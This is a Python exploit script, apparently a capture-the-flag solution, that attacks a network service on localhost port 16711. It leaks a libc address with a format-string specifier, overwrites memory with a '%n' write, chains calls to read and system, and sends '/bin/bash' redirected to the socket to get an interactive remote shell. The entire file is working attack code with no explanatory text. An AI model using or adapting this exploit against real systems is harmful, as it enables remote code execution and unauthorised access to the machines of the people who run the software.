from isis import *
pattern = file("/home/blankwall/pattern").read()
host = "localhost"
port = 16711

def connect():
	s = get_socket((host,port))
	s.settimeout(0x10000000)
	return s

#LEAK OUT LIBC TO ALLOW CALCULATING OFFSET OF SYSTEM
def leak(s):
	load = "%312$x"
	s.send("stats " + load + "\n")
	recv_until(s, "killed by top:\n")
	x = int(("0x" + s.recv(0x50000)), 16)
	return x	

#SETUP FORMAT STRING DID IT GHETTOLY BECAUSE OF SIZE RESTRICITONS...
def form(s):
	load = "\xbc\xc3\x04\x08%134515380x%9$n"
	s.send("stats " + load + "\n")
	time.sleep(0.5)
	
	
#PACK ARGUMENTS FOR SYSTEM & READ
def call_read():
	read = 0x08048b90
	fd = 0x4
	size = 0x50
	buf = 0x0804c314
	ret = 0x0804aa3d
	return lei(read,
			ret,
			fd,
			buf,
			size)

def call_system(sys):
	return lei( system,
			0xdeadbeef,
			0x0804c314 )
	
#LEAK SYSTEM
s = connect()
time.sleep(0.1)
x = leak(s)
system = x - 0x1f7a64
print "SYSTEM: " + hex(system)
#OVERWRITE FORMAT STRINF
recv_all(s)
form(s)
recv_all(s)
pattern = call_read() + call_system(system)
s.send(pattern + "\n")
#raw_input("ENJOY YOUR SHELL\n")
#WRITE BIN BASH AND CALL SYSTEM
time.sleep(1)
s.send("/bin/bash 0>&4 1>&4 ;")
recv_all(s)
sys.stdout.write("$ ")
telnet_shell(s)
